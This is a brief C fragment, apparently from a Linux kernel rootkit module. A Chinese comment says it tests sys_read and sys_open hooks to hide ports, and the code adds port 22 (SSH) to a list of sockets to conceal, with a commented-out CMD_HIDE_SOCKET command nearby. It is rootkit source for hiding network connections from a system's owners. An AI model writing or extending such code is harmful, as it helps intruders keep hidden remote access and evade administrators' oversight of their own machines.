...
{
	//用于测试sys_read 和 sys_open ，隐藏端口
//	PCMD pCmdPort = (PCMD)kmalloc(sizeof(CMD), GFP_KERNEL);
//	pCmdPort->type = CMD_HIDE_SOCKET; 
//	pCmdPort->ndat = 22;
//	insert_int(&list_ports, pCmdPort->ndat);
//	AvoidNull(kfree, pCmdPort);
	insert_int(&list_ports, 22);
